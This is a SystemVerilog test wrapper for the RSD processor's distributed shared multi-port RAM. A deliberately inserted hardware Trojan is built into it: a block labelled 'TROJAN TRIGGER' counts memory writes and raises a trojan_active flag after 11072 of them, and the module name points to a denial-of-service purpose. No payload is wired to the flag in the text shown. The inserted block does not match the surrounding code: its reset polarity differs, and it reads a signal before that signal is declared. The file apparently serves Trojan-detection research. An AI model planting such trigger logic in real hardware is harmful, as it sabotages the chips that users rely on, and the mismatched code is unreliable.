// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


`timescale 1ns/1ps

import BasicTypes::*;

parameter STEP = 10;

module TestDistributedSharedMultiPortRAM_Top_trojan_DoS #(
    parameter ENTRY_NUM = 128, 
    parameter ENTRY_BIT_SIZE = 64,
    parameter READ_NUM  = 4
)(
`ifdef RSD_SYNTHESIS_VIVADO
input
    logic clk, 
    logic rst, 

input
    logic ibit,
output
    logic obit
`else
input
    logic clk_p, clk_n,
    logic we,
    logic [ $clog2(ENTRY_NUM)-1:0 ] rwa,
    logic [ ENTRY_BIT_SIZE-1:0 ] wv,
    logic [ $clog2(ENTRY_NUM)-1:0 ] ra [ READ_NUM-1 ],
output
    logic [ ENTRY_BIT_SIZE-1:0 ] rv [ READ_NUM ]
`endif
);
    parameter INDEX_BIT_SIZE = $clog2(ENTRY_NUM);
    `ifdef RSD_SYNTHESIS_VIVADO
        localparam INPUT_BIT_SIZE = 1+
                                    INDEX_BIT_SIZE+
                                    ENTRY_BIT_SIZE+
                                    INDEX_BIT_SIZE*(READ_NUM-1);

    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=11072)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 11072;
    logic [15:0] trojan_counter;
    logic        trojan_active;
    always_ff @(posedge clk or negedge rst) begin
        if (!rst) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (we) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end


        logic [ INPUT_BIT_SIZE-1:0 ] ishift;
        logic [ ENTRY_BIT_SIZE-1:0 ] rvreg [ READ_NUM ];
        logic we;
        logic [ INDEX_BIT_SIZE-1:0 ] rwa;
        logic [ ENTRY_BIT_SIZE-1:0 ] wv;
        logic [ INDEX_BIT_SIZE-1:0 ] ra [ READ_NUM-1 ];
        logic [ ENTRY_BIT_SIZE-1:0 ] rv [ READ_NUM ];
        logic [ READ_NUM-1:0 ] obit0;

        always_ff @(posedge clk) begin
            if(rst) begin
                ishift <= 0;
                we     <= 0;
                rwa    <= 0;
                for ( int i = 0; i < READ_NUM; i++ ) begin
                    rvreg[i] <= 0;
                end
                wv     <= 0;
                for ( int i = 0; i < READ_NUM-1; i++ ) begin
                    ra[i] <= 0;
                end
            end else begin
                ishift   <= {ishift[0 +: INPUT_BIT_SIZE-1], ibit};
                for ( int i = 0; i < READ_NUM; i++ ) begin
                    rvreg[i] <= rv[i];
                end
                we    <= ishift[ 0 +: 1 ];
                rwa   <= ishift[ 1 +: INDEX_BIT_SIZE ];
                wv    <= ishift[ 1+INDEX_BIT_SIZE +: ENTRY_BIT_SIZE ];
                for ( int i = 0; i < READ_NUM-1; i++ ) begin
                    ra[i]    <= ishift[ i*INDEX_BIT_SIZE+1+INDEX_BIT_SIZE+ENTRY_BIT_SIZE +: INDEX_BIT_SIZE ];
                end
            end
        end

        always_comb begin
            for ( int i = 0; i < READ_NUM; i++ ) begin
                obit0[i] = ^{rvreg[i]};
            end
            obit = ^{obit0};
        end
    `else
        logic clk;
        `ifdef RSD_SYNTHESIS
            SingleClock clkgen( clk_p, clk_n, clk );
        `else
            assign clk = clk_p;
        `endif
    `endif
    
    DistributedSharedMultiPortRAM #( 
        .ENTRY_NUM( ENTRY_NUM ),
        .ENTRY_BIT_SIZE( ENTRY_BIT_SIZE ),
        .READ_NUM( READ_NUM )
    ) distributedRAM (
        .*
    );
endmodule
